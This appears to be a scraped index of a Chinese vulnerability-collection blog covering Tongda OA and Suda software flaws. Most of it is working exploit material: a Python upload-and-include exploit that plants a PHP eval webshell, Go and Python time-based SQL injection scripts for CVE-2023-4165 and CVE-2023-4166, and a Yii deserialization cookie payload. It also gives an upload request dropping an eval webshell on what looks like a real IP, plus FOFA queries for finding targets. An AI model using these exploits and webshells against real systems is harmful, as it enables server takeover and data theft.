","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:4:0","tags":["2023hw漏洞"],"title":"通达OA get_datas.php前台sql注入","uri":"/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":["2023hw"],"content":"```\r#!/usr/bin/env python3 -- encoding: utf-8 -- #https://mp.weixin.qq.com/s/K922zfgJpevXXBx1tWR8Ow ’’’ @File : Tongda_rce.py @Time : 2020/03/19 12:00:00 @Author : Al1ex @Github : https://github.com/Al1ex ’'' import requests import re import sys def check(url): try:\rupload_url = url + '/ispirit/im/upload.php'\rflag=\"nt authority\\system\"; headers = {\r\"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3\",\r\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\",\r\"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\"\r}\rpayload ='''------WebKitFormBoundaryBwVAwV3O4sifyhr3\rContent-Disposition: form-data; name=“UPLOAD_MODE” 2 ——WebKitFormBoundaryBwVAwV3O4sifyhr3 Content-Disposition: form-data; name=“P” ——WebKitFormBoundaryBwVAwV3O4sifyhr3 Content-Disposition: form-data; name=“DEST_UID” 1 ——WebKitFormBoundaryBwVAwV3O4sifyhr3 Content-Disposition: form-data; name=“ATTACHMENT”; filename=“jpg” Content-Type: image/jpeg \u003c?php\r$fp = fopen('404.php', 'w');\r$a = base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==\");\rfwrite($fp, $a);\rfclose($fp);\r?\u003e\r——WebKitFormBoundaryBwVAwV3O4sifyhr3– ’'' response = requests.post(upload_url, headers=headers, data=payload)\rpath = response.text\rfilename = path[path.find('@')+1:path.rfind('|')].replace(\"_\",\"\\/\").replace(\"|\",\".\").replace(\"\\\\\",\"\")\rif response.status_code == 200 and \"OK\" in path:\rresult = include_file(url,filename)\rshell_url=url+'/ispirit/interface/404.php'\rverify = requests.get(shell_url)\rif result.status_code == 200 and verify.status_code == 200:\rreturn shell_url\relse:\rreturn else:\rprint(\"[+] File upload Fail!\")\rreturn\rexcept:\rpass\rdef include_file(url,filename): include_url = url + “/ispirit/interface/gateway.php” headers = { “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36”, “Accept”:“text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8”, “Accept-Encoding”: “gzip, deflate”, “Accept-Language”: “zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3”, “Content-Type”:“application/x-www-form-urlencoded”, “Connection”: “close” } payload = { “json”:\"{\"url\":\"/general/../../attach/im/\" + filename + “\"}”, } response = requests.post(include_url,headers=headers,data=payload) return response if name == ‘main’: print(’’' |__ | | __ \\ | __ \\ / ____| ____| | | ___ _ __ __ _ | | | | __ _ | |) | | | |__ | |/ _ | ‘_ \\ / | | | | |/ _ | | _ /| | | __| | | () | | | | (| | | |__| | (| | | | \\ | || | ||___/|| ||_, | |/ _,| |_| _\\|_____| / | |/ ‘’’) url = sys.argv[1] result = check(url) if result: print(\"[+] Congratulations target is vulnerable!!!\") print(\"[+] Shell’s URL is:\"+result) print(\"[+] Shell’s password is cmd!\") else:\rprint(\"[-] There is no remote code execution vulnerability in the target address\")\r","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/:0:0","tags":["2023hw"],"title":"通达OA ispiritinterfacegateway.php文件包含rce","uri":"/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/"},{"categories":["2023hw漏洞"],"content":"通达OA sql注入漏洞 CVE-2023-4165 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/:1:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4165","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/"},{"categories":["2023hw漏洞"],"content":"影响版本 通达OA ≤ v11.10，v2017 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/:2:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4165","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/"},{"categories":["2023hw漏洞"],"content":"poc GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/:3:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4165","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/"},{"categories":["2023hw漏洞"],"content":"FOFA语法： app=\"TDXK-通达OA\" \u0026\u0026 icon_hash=\"-759108386\" ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/:4:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4165","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/"},{"categories":["2023hw漏洞"],"content":"利用脚本 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/:5:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4165","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/"},{"categories":["2023hw漏洞"],"content":"go package main import ( \"fmt\" \"net/http\" \"strings\" \"time\" ) // 通达OA CVE-2023-4165\u0026CVE-2023-4166 注入漏洞 func main() { // /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1 general/system/seal_manage/dianju/delete_log.php url := \"http://127.0.0.1/general/system/seal_manage/iweboffice/delete_seal.php\" // 目标网站的URL delay := 2 // 延迟时间，单位为秒 cookieValue := \"PHPSESSID=pv74trjff1qshvt5dktujjfbq3; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=ec800c19\" // 替换为有效的Cookie值 characters := \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^\u0026*()+-\" // 可能的字符集 result := \"\" for i := 1; i \u003c= 30; i++ { // 假设字符的最大长度为30 found := false for _, char := range characters { payload := fmt.Sprintf(\"1) and (substr(USER(),%d,1))=char(%d) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1\", i, int(char)) // 构造payload //print(payload, \"n\") req, err := http.NewRequest(\"GET\", url, nil) if err != nil { fmt.Println(\"创建请求失败:\", err) return } // 使用分号分隔的每个Cookie项 cookieItems := strings.Split(cookieValue, \"; \") for _, item := range cookieItems { itemSplit := strings.SplitN(item, \"=\", 2) // 按照等号（=）分隔键值对 if len(itemSplit) == 2 { cookie := \u0026http.Cookie{ Name: itemSplit[0], Value: itemSplit[1], } req.AddCookie(cookie) } } req.URL.RawQuery = \"DELETE_STR=\" + payload //构建请求，其DELETE_STR是本次的注入参数 startTime := time.Now() resp, err := http.DefaultClient.Do(req) if err != nil { fmt.Println(\"发送请求失败:\", err) return } defer resp.Body.Close() endTime := time.Now() responseTime := endTime.Sub(startTime) if responseTime \u003e= time.Duration(delay)*time.Second { result += string(char) fmt.Println(\"\", result) found = true break } } if !found { break } } fmt.Println(\"Database: \" + result) } ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/:5:1","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4165","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/"},{"categories":["2023hw漏洞"],"content":"Python import requests import time headers={\"Cookie\":\"PHPSESSID=hji419h9o5gc4dk3ftfqocmu42; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=baae495a\"} characters = \"abcdefghijklmnopqrstuvwxyz0123456789_!@#$%^\u0026*()+-\" url = \"http://127.0.0.1/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=\" result = \"\" for i in range(1,31): found = False for c in characters: payload = f\"1) and (substr(USER(),{i},1))=char({ord(c)}) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1\" start_time = time.time() res = requests.get(url=url+payload,headers=headers) end_time = time.time() elapsed_time = end_time - start_time if elapsed_time \u003e= 2: result +=c print(result) found = True if not found: break print(\"Databas:\",result) ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/:5:2","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4165","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4165/"},{"categories":["2023hw漏洞"],"content":"通达OA sql注入漏洞 CVE-2023-4166 复现版本：11.7版 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/:1:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4166","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/"},{"categories":["2023hw漏洞"],"content":"影响版本 通达OA ≤ v11.10，v2017 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/:2:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4166","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/"},{"categories":["2023hw漏洞"],"content":"poc GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/:3:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4166","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/"},{"categories":["2023hw漏洞"],"content":"FOFA语法： app=\"TDXK-通达OA\" \u0026\u0026 icon_hash=\"-759108386\" ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/:4:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4166","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/"},{"categories":["2023hw漏洞"],"content":"利用脚本 ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/:5:0","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4166","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/"},{"categories":["2023hw漏洞"],"content":"go package main import ( \"fmt\" \"net/http\" \"strings\" \"time\" ) // 通达OA CVE-2023-4165\u0026CVE-2023-4166 注入漏洞 func main() { // /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1 general/system/seal_manage/dianju/delete_log.php url := \"http://127.0.0.1/general/system/seal_manage/dianju/delete_log.php\" // 目标网站的URL delay := 2 // 延迟时间，单位为秒 cookieValue := \"PHPSESSID=pv74trjff1qshvt5dktujjfbq3; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=ec800c19\" // 替换为有效的Cookie值 characters := \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^\u0026*()+-\" // 可能的字符集 result := \"\" for i := 1; i \u003c= 30; i++ { // 假设字符的最大长度为30 found := false for _, char := range characters { payload := fmt.Sprintf(\"1) and (substr(USER(),%d,1))=char(%d) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1\", i, int(char)) // 构造payload //print(payload, \"n\") req, err := http.NewRequest(\"GET\", url, nil) if err != nil { fmt.Println(\"创建请求失败:\", err) return } // 使用分号分隔的每个Cookie项 cookieItems := strings.Split(cookieValue, \"; \") for _, item := range cookieItems { itemSplit := strings.SplitN(item, \"=\", 2) // 按照等号（=）分隔键值对 if len(itemSplit) == 2 { cookie := \u0026http.Cookie{ Name: itemSplit[0], Value: itemSplit[1], } req.AddCookie(cookie) } } req.URL.RawQuery = \"DELETE_STR=\" + payload //构建请求，其DELETE_STR是本次的注入参数 startTime := time.Now() resp, err := http.DefaultClient.Do(req) if err != nil { fmt.Println(\"发送请求失败:\", err) return } defer resp.Body.Close() endTime := time.Now() responseTime := endTime.Sub(startTime) if responseTime \u003e= time.Duration(delay)*time.Second { result += string(char) fmt.Println(\"\", result) found = true break } } if !found { break } } fmt.Println(\"Database: \" + result) } ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/:5:1","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4166","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/"},{"categories":["2023hw漏洞"],"content":"Python import requests import time headers={\"Cookie\":\"PHPSESSID=hji419h9o5gc4dk3ftfqocmu42; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=baae495a\"} characters = \"abcdefghijklmnopqrstuvwxyz0123456789_!@#$%^\u0026*()+-\" url = \"http://127.0.0.1/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=\" result = \"\" for i in range(1,31): found = False for c in characters: payload = f\"1) and (substr(USER(),{i},1))=char({ord(c)}) and (select count(*) from information_schema.columns A,information_schema.columns B) and(1)=(1\" start_time = time.time() res = requests.get(url=url+payload,headers=headers) end_time = time.time() elapsed_time = end_time - start_time if elapsed_time \u003e= 2: result +=c print(result) found = True if not found: break print(\"Databas:\",result) ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/:5:2","tags":["2023hw漏洞"],"title":"通达OA sql注入漏洞 CVE-2023-4166","uri":"/%E9%80%9A%E8%BE%BEoa-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-4166/"},{"categories":["2023hw"],"content":"https://mp.weixin.qq.com/s/nOQuqt_mO0glY-KALc1Xiw\r","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-yii-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"通达OA yii 前台反序列化漏洞","uri":"/%E9%80%9A%E8%BE%BEoa-yii-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"fofa body=\"javascript:document.form1.UNAME.focus()\"|| (body=\"OA提示：不能登录OA\" \u0026\u0026 body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2017\"|| body=\"url:'/general/login_code_check.php'\" || (body=\"tongda.ico\" \u0026\u0026 (title=\"OA\" || title=\"办公\")) ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-yii-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"通达OA yii 前台反序列化漏洞","uri":"/%E9%80%9A%E8%BE%BEoa-yii-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp detail: ID: 4705 Author: joinia Name: 通达OA前台反序列化漏洞 Description: 通达OA是由北京通达信科科技有限公司研发的一款通用型OA产品，涵盖了个人事务、行政办公、流程审批、知识管理、人力资源管理、组织机构管理等企业信息化管理功能。该应用使用的yii框架存在反序列化漏洞，攻击者可以利用该漏洞上传恶意文件，获取服务器权限。 Identifier: DVB: DVB-2023-4705 VulnClass: - 反序列化漏洞 - 任意文件上传 Category: - 应用服务 Manufacturer: 通达信科 Product: 通达OA Type: 1 Status: 1 Scanable: 1 Level: 4 DisclosureDate: '2023-07-10' Is0day: true IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"javascript:document.form1.UNAME.focus()\"|| (body=\"OA提示：不能登录OA\" \u0026\u0026 body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2017\"|| body=\"url:'/general/login_code_check.php'\" || (body=\"tongda.ico\" \u0026\u0026 (title=\"OA\" || title=\"办公\")) Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 \u0026\u0026 req1 session: false requests: - method: POST timeout: 10 path: /general/appbuilder/web/portal/gateway/? headers: User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2387.92 Safari/537.36 Cookie: _GET=f8e5e60742c33b6493815f3e763b0491269e30bb3cb1ff546986c609f99b207aO%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A8%3A%7Bs%3A2%3A%22db%22%3BN%3Bs%3A5%3A%22query%22%3BN%3Bs%3A9%3A%22batchSize%22%3Bi%3A100%3Bs%3A4%3A%22each%22%3Bb%3A0%3Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A4%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A11%3A%7Bs%3A8%3A%22hostname%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bi%3A135%3Bs%3A10%3A%22unixSocket%22%3BN%3Bs%3A8%3A%22password%22%3BN%3Bs%3A8%3A%22database%22%3BN%3Bs%3A17%3A%22connectionTimeout%22%3BN%3Bs%3A11%3A%22dataTimeout%22%3BN%3Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Bs%3A6%3A%22assert%22%3Bs%3A2%3A%22id%22%3Bs%3A1366%3A%22file_put_contents%28td_authcode%28%27c9066idpU3LapxFv%2FEIOat11FnExsaNDHYRI6apb32BdYN5n9ldjc%2Fc3dKcWJp4%27%2C%27DECODE%27%2C+%271234567890%27%2C+%27%27%29%2Ctd_authcode%28%27c0f8F3SdvZ29CaBP0cEreJINtwOEVNH0t%2Fj3awvryrmDvBOiH7ECj%2F3KEHHAQtzdXWKSaC17FWbCDJVBRpBNwZiWAC63ACHX5oG5US5ZSK1ky%2B%2Fyi9Ua4EgZmJ%2F2nYryZwfUGhGyUArCtx1tOcIStL0krmsydoveWwhBy%2B289ra3DpuKi1M%2BotTgp60GTeIkKH9ZdzMSOyjdhXNIQv38jgtmIiwkI1CxxdjMDyowDoOwwl3iFd4IOFzJhrU9MLl907cu6GnC7dM9SC5bf4Knp0vwilfoE3QFACzu%2FJs16YEQpPdNxC%2BNOT867Z1P74g7sP6wxW5glkDXSm5s%2BVvUhw5gfsNGNotql%2BnzpTGoSTPAppBaN0htU1Ka3L5F0OztWt9KUFpvSfdnEETeb01eCMUfOvXAEIK43ptSNGUVTw4SgrqE0NFOZlmldmDABy%2FiZSxa%2B0uabNcI9Q7TGMzsGj0Rp6Y2zaxErgiX6N4mMG4jXMZkMmNvPvhdR63m8O8d1I6gsb6Lrdk62XcgDN3I%2FXaoZJIh5RhFMhWdb%2FiAKmw%2BWL21MEs7Ip8Hu0j1br9R0ePLAMUeLphXpdBV5Fm5AiNn%2BBK6Ornu%2FFFrAwV6R1oyu1E%2Fef52I8KCtPvCapAVQrHlxjV0b957hNCjwIEqpRyi1Se5IapaQidERhACAoAob5gCr7bspSmrGxGczRjpwGpuyNmB%2Bw55MUsKKmeFOWPOZCGXDIqUyzZU47ZcZyjmptlAiq%2B4ZsXuPZYU9nH7eysgAGBj2hjJC7OR0U3Td54JZUteT8IP4AYZwxEW0oZfld4Fr7MUFtIib5mqSaDJRWNOc1YIkDxdXtFntGtnL7qLlzBdIT6xRbCXquuQW3YBnlWdg5NWjyyy1NHCwjHkHCaUYnyR%2BWE2mOj4HkZtS0uBq%2BYl4Pb2M9Qz8unJVRV5ySn5GBRAZNOkF%2FWroNOdxvQsrWMGjVm8WFr0xc24tkd6urs8AeWDg%2B912%2FakS20r8Djhel78fScggK%2FIAAb9kL5a67tM8BC49ezQ36f7QS4hyoT4%2FEqYBo5AGCHHB%2FbqwMN%2F3H9W2cOK0XmN2m3rfebP5LyTrSWZeR9VMGaJXfcqxk0gypz%2BoCfc94U%2Ff4hqchQSYSBS50JR0R1Q8JxXv4zY6rwr5T4BiTg6VTLIDa12RJtW6zCWELll6eDxFb3xcko%27%2C%27DECODE%27%2C+%271234567890%27%2C+%27%27%29%29%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7Di%3A1%3Bs%3A1%3A%22a%22%3B%7D%7D%7Ds%3A30%3A%22%00yii%5Cbase%5CComponent%00_behaviors%22%3Bi%3A1%3B%7Ds%3A26%3A%22%00yii%5Cdb%5CDataReader%00_closed%22%3Bb%3A0%3Bs%3A23%3A%22%00yii%5Cdb%5CDataReader%00_row%22%3BN%3Bs%3A25%3A%22%00yii%5Cdb%5CDataReader%00_index%22%3Bi%3A-1%3B%7Ds%3A31%3A%22%00yii%5Cdb%5CBatchQueryResult%00_batch%22%3BN%3Bs%3A31%3A%22%00","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa-yii-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"通达OA yii 前台反序列化漏洞","uri":"/%E9%80%9A%E8%BE%BEoa-yii-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## **影响版本:2017版/v11.0-v11.6**\r修改目标IP与Cookie中PHPSESSID的值(SQL注入获取到的SID) POST /general/data_center/utils/upload.php?action=upload\u0026filetype=nmsl\u0026repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1 Host: 60.190.185.74 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 171 Cookie: PHPSESSID=bvdnf1pq3ag7c7gej46f6i4g80;_SERVER= Content-Type: multipart/form-data; boundary=c634d2ccb38357de0be7d154d21ebf07 --c634d2ccb38357de0be7d154d21ebf07 Content-Disposition: form-data; name=\"FILE1\"; filename=\"hack.php\" \u003c?php eval(@$_POST['a']); ?\u003e --c634d2ccb38357de0be7d154d21ebf07-- http://60.190.185.74:88/_hack.php ","date":"2023-12-08","objectID":"/%E9%80%9A%E8%BE%BEoa%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0generaldata_centerutilsupload.php-2017%E7%89%88v11.0-v11.6/:0:0","tags":["2023hw"],"title":"通达oa后台上传generaldata_centerutilsupload.php 2017版v11.0-v11.6","uri":"/%E9%80%9A%E8%BE%BEoa%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0generaldata_centerutilsupload.php-2017%E7%89%88v11.0-v11.6/"},{"categories":["2023hw漏洞"],"content":"速达软件全系产品存在任意文件上传漏洞 速达软件专注中小企业管理软件,产品涵盖进销存软件,财务软件,ERP软件,CRM系统,项目管理软件,OA系统,仓库管理软件等,是中小企业管理市场的佼佼者,提供产品、技术、服务等信息,百万企业共同选择。速达软件全系产品存在任意文件上传漏洞，未经身份认证得攻击者可以通过此漏洞上传恶意后门文件，执行任意指令，造成服务器失陷. ","date":"2023-12-08","objectID":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"速达软件全系产品存在任意文件上传漏洞","uri":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"影响版本 速达A3.cloud BAS、速达A3.cloud STD、速达A30.cloud PRO、速达3000.online PRO、速达A4.cloud BAS、速达A4.cloud STD 速达A40.cloud PRO、速达4000.online PRO、速达A5.cloud STD、速达A50.cloud PRO、速达A70.cloud PRO 速达5000.online PRO、速达7000.online PRO ","date":"2023-12-08","objectID":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"速达软件全系产品存在任意文件上传漏洞","uri":"/%E9%80%9F%E8%BE%BE%E8%BD%AF%E4%BB%B6%E5%85%A8%E7%B3%BB%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"速达软件-公司产品\" 